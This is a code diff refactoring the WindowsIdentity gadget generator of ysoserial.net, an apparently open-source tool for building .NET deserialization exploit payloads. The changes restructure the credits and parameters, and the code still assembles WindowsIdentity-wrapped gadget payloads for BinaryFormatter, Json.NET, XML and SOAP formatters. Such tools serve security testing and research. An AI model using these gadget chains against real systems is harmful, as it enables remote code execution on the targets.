@@ -45,14 +45,19 @@ namespace ysoserial.Generators
             return "WindowsIdentity";
         }
 
-        public override string Credit()
+        public override string Finders()
         {
-            return "Levi Broderick, updated by Soroush Dalili";
+            return "Levi Broderick";
         }
 
-        public override bool isDerived()
+        public override string Contributors()
         {
-            return true;
+            return "Levi Broderick, Soroush Dalili";
+        }
+
+        public override List<string> Labels()
+        {
+            return new List<string> { GadgetTypes.BridgeAndDerived };
         }
 
         [Serializable]
@@ -72,10 +77,10 @@ namespace ysoserial.Generators
             }
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
+        public override object Generate(string formatter, InputArgs inputArgs)
         {
             Generator generator = new TextFormattingRunPropertiesGenerator();
-            byte[] binaryFormatterPayload = (byte[])generator.Generate(cmd, "BinaryFormatter", false, minify, useSimpleType);
+            byte[] binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
@@ -83,7 +88,7 @@ namespace ysoserial.Generators
                 || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase))
             {
                 var obj = new IdentityMarshal(b64encoded);
-                return Serialize(obj, formatter, test, minify, useSimpleType);
+                return Serialize(obj, formatter, inputArgs);
             }
             else if (formatter.ToLower().Equals("json.net"))
             {
@@ -92,12 +97,19 @@ namespace ysoserial.Generators
                     'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
                 }";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    payload = JSONMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                    if (inputArgs.UseSimpleType)
+                    {
+                        payload = JSONMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                    }
+                    else
+                    {
+                        payload = JSONMinifier.Minify(payload, null, null);
+                    }
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -117,9 +129,9 @@ namespace ysoserial.Generators
        </WindowsIdentity>
 </root>
 ";
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    if (useSimpleType)
+                    if (inputArgs.UseSimpleType)
                     {
                         payload = XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null);
                     }
@@ -129,7 +141,7 @@ namespace ysoserial.Generators
                     }
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -149,9 +161,9 @@ namespace ysoserial.Generators
 </w>
 </root>
 ";
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    if (useSimpleType)
+                    if (inputArgs.UseSimpleType)
                     {
                         payload = XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null);
                     }
@@ -161,7 +173,7 @@ namespace ysoserial.Generators
                     }
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -183,9 +195,9 @@ namespace ysoserial.Generators
 </SOAP-ENV:Body>
 </SOAP-ENV:Envelope>
 ";
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    if (useSimpleType)
+                    if (inputArgs.UseSimpleType)
                     {
                         payload = XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null, FormatterType.SoapFormatter);
                     }
@@ -195,7 +207,7 @@ namespace ysoserial.Generators
                     }
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
